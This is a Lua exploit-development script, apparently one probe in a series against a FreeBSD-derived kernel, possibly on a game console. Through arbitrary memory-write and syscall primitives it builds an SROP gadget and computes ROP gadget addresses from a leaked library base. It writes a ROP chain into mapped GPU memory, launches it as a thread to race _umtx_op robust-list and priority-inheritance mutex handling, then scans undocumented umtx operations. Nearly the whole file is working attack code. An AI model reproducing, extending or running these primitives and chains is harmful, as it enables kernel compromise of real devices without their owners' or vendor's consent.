-- CRASH_CLASS: MODERATE
-- PROBE 146b: UMTX robust lists (never tested on 454) + multi-thread PI race
--
-- 146a confirmed: PI mutex lock/unlock/contention all work
-- Now: test ROBUST_LISTS (op 26), and create a real race with 2+ threads

print("=== PROBE 146b: ROBUST + RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- [A] ROBUST_LISTS (op 26 on syscall 454)
print("--- [A] ROBUST_LISTS ---")

-- struct umtx_robust_lists_params {
--     uintptr_t   robust_list_offset;     // +0x00
--     uintptr_t   robust_priv_list_offset; // +0x08
--     uintptr_t   robust_inact_offset;     // +0x10
-- };
-- _umtx_op(params, UMTX_OP_ROBUST_LISTS=26, sizeof(params), NULL, NULL)

local rparams = memory.alloc(64)

-- Test 1: Set robust lists to NULL (should just register)
wq(rparams, uint64(0))
wq(rparams + 8, uint64(0))
wq(rparams + 16, uint64(0))
local rr1 = srop(454, uint64(rparams), uint64(26), uint64(24), uint64(0), uint64(0))
print("robust_null=" .. (rr1 and tostring(to_num(rr1)) or "nil"))

-- Test 2: Set robust lists to GPU memory addresses
local robust_head = gpu + 0x50000
local robust_priv = gpu + 0x51000
local robust_inact = gpu + 0x52000

-- Initialize list heads (point to themselves = empty list)
wq(robust_head, uint64(string.format("0x%X%08X", gh, gl + 0x50000)))
wq(robust_priv, uint64(string.format("0x%X%08X", gh, gl + 0x51000)))
wq(robust_inact, uint64(string.format("0x%X%08X", gh, gl + 0x52000)))

wq(rparams, uint64(string.format("0x%X%08X", gh, gl + 0x50000)))
wq(rparams + 8, uint64(string.format("0x%X%08X", gh, gl + 0x51000)))
wq(rparams + 16, uint64(string.format("0x%X%08X", gh, gl + 0x52000)))

local rr2 = srop(454, uint64(rparams), uint64(26), uint64(24), uint64(0), uint64(0))
print("robust_gpu=" .. (rr2 and tostring(to_num(rr2)) or "nil"))

-- Test 3: Lock a PI mutex and add it to robust list
local rob_mtx = gpu + 0x53000
local rob_addr = uint64(string.format("0x%X%08X", gh, gl + 0x53000))
wd(rob_mtx, 0)        -- m_owner = 0
wd(rob_mtx + 4, 4)    -- UMUTEX_PRIO_INHERIT
for off = 8, 47, 4 do wd(rob_mtx + off, 0) end

-- Lock the mutex
local lr = srop(454, uint64(rob_addr), uint64(5), uint64(0), uint64(0), uint64(0))
print("rob_lock=" .. (lr and tostring(to_num(lr)) or "nil"))
print("rob_owner=" .. to_num(memory.read_dword(rob_mtx)))

-- Link mutex into robust list
-- The robust list is a singly-linked list through the mutex's m_rb_lnk field
-- m_rb_lnk is at offset +16 in struct umutex
wq(rob_mtx + 16, uint64(string.format("0x%X%08X", gh, gl + 0x50000))) -- point back to head
-- Update head to point to mutex
wq(robust_head, rob_addr)

-- Now kill the thread — the kernel should walk the robust list and unlock
-- But we can't kill the main thread safely. Let me create a child thread that:
-- 1. Registers robust list
-- 2. Locks a mutex
-- 3. Links it to robust list
-- 4. Exits (dies) without unlocking → kernel should auto-unlock

print("")
print("--- [B] THREAD DEATH ROBUST ---")

-- New mutex for the child
local child_mtx = gpu + 0x54000
local child_addr = uint64(string.format("0x%X%08X", gh, gl + 0x54000))
wd(child_mtx, 0)
wd(child_mtx + 4, 4) -- PI
for off = 8, 47, 4 do wd(child_mtx + off, 0) end

-- Child robust list head
local child_robust = gpu + 0x55000
wq(child_robust, uint64(string.format("0x%X%08X", gh, gl + 0x55000))) -- self-link = empty

-- Child robust params
local child_rparams = gpu + 0x56000
wq(child_rparams, uint64(string.format("0x%X%08X", gh, gl + 0x55000)))
wq(child_rparams + 8, uint64(0))
wq(child_rparams + 16, uint64(0))

local child_done = gpu + 0x60000
wq(child_done, uint64(0))
local child_done_addr = uint64(string.format("0x%X%08X", gh, gl + 0x60000))

local ts_short = gpu + 0x61000
wq(ts_short, uint64(0))
wq(ts_short + 8, uint64(50000000))
local ts_short_a = uint64(string.format("0x%X%08X", gh, gl + 0x61000))

-- Child ROP chain:
-- 1. nanosleep 50ms
-- 2. _umtx_op(rparams, 26, 24, 0, 0) — register robust list
-- 3. _umtx_op(child_mtx, 5, 0, 0, 0) — lock mutex
-- 4. Write marker
-- 5. thr_exit(0) — sys 431, exit without unlocking
local rop_b = gpu + 0x70000
local rop_b_a = uint64(string.format("0x%X%08X", gh, gl + 0x70000))
local i = 0

local child_rparams_a = uint64(string.format("0x%X%08X", gh, gl + 0x56000))

-- nanosleep 50ms
wq(rop_b+i, g_pop_rdi); i=i+8
wq(rop_b+i, ts_short_a); i=i+8
wq(rop_b+i, g_pop_rsi); i=i+8
wq(rop_b+i, uint64(0)); i=i+8
wq(rop_b+i, g_pop_rax); i=i+8
wq(rop_b+i, uint64(240)); i=i+8
wq(rop_b+i, sc_addr); i=i+8

-- Register robust list: _umtx_op(rparams, 26, 24, 0, 0)
wq(rop_b+i, g_pop_rdi); i=i+8
wq(rop_b+i, child_rparams_a); i=i+8
wq(rop_b+i, g_pop_rsi); i=i+8
wq(rop_b+i, uint64(26)); i=i+8
wq(rop_b+i, g_pop_rax); i=i+8
wq(rop_b+i, uint64(454)); i=i+8
wq(rop_b+i, sc_addr); i=i+8

-- Lock mutex: _umtx_op(child_mtx, 5, 0, 0, 0)
wq(rop_b+i, g_pop_rdi); i=i+8
wq(rop_b+i, child_addr); i=i+8
wq(rop_b+i, g_pop_rsi); i=i+8
wq(rop_b+i, uint64(5)); i=i+8
wq(rop_b+i, g_pop_rax); i=i+8
wq(rop_b+i, uint64(454)); i=i+8
wq(rop_b+i, sc_addr); i=i+8

-- Write done marker
wq(rop_b+i, g_pop_rax); i=i+8
wq(rop_b+i, uint64("0x00000000CAFE0001")); i=i+8
wq(rop_b+i, g_pop_rdi); i=i+8
wq(rop_b+i, child_done_addr); i=i+8
wq(rop_b+i, g_wr); i=i+8

-- thr_exit(0) = sys 431
wq(rop_b+i, g_pop_rdi); i=i+8
wq(rop_b+i, uint64(0)); i=i+8
wq(rop_b+i, g_pop_rax); i=i+8
wq(rop_b+i, uint64(431)); i=i+8
wq(rop_b+i, sc_addr); i=i+8

-- Thread context
local tctx_b = gpu + 0x80000
for off = 0, 0x4FF, 4 do wd(tctx_b + off, 0) end
pcall(function() return sc_gc(uint64(tctx_b)) end)
wq(tctx_b + 0xE0, g_ret)
wq(tctx_b + 0xF8, rop_b_a)
wq(tctx_b + MC + 0x18, uint64(24))  -- RDX = 24 (sizeof robust params)
wq(tctx_b + MC + 0x50, uint64(0))   -- R10
wq(tctx_b + MC + 0x28, uint64(0))   -- R8
wq(tctx_b + MC + 0x30, uint64(0))   -- R9

local tbuf_b = gpu + 0x90000
wq(tbuf_b, uint64(0))

print("launching robust child")
local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(tctx_b), uint64(tbuf_b), uint64(0))
end)
print("thr=" .. tostring(rv_t))

-- Wait for child to lock and exit
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

-- Check results
local cd = memory.read_qword(child_done)
local cdh, cdl = get_hi_lo(cd)
print("child_done=0x" .. string.format("%08X", cdl))

local co = to_num(memory.read_dword(child_mtx))
print("child_mtx_owner=" .. co .. " (0x" .. string.format("%08X", co) .. ")")

-- If kernel walked robust list, m_owner should have UMUTEX_OWNER_DEAD (0x40000000) set
if co ~= 0 then
    local dead = (co >= 0x40000000 and co < 0x80000000)
    local contested_dead = (co >= 0xC0000000)
    if dead or contested_dead then
        print("*** OWNER_DEAD flag set! Kernel walked robust list ***")
    end
end

-- [C] UMTX op scan: test remaining ops on 454
print("")
print("--- [C] OP SCAN ---")
local test_addr = gpu + 0xA0000
for off = 0, 63, 4 do wd(test_addr + off, 0) end
local test_a = uint64(string.format("0x%X%08X", gh, gl + 0xA0000))

for op = 0, 30 do
    if op ~= 5 and op ~= 6 and op ~= 25 then
        wd(test_addr, 0)
        wd(test_addr + 4, 0)
        local ok_op, rv_op = pcall(function()
            return srop(454, uint64(test_a), uint64(op), uint64(0), uint64(0), uint64(0))
        end)
        local rv = -999
        if ok_op and rv_op ~= nil then rv = to_num(rv_op) end
        if rv ~= -1 and rv ~= 4294967295 and rv ~= -999 then
            print("op" .. op .. "=" .. rv .. " ***")
        else
            -- Check if it wrote anything
            local w0 = to_num(memory.read_dword(test_addr))
            if w0 ~= 0 then
                print("op" .. op .. "=-1 but wrote 0x" .. string.format("%08X", w0))
            end
        end
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
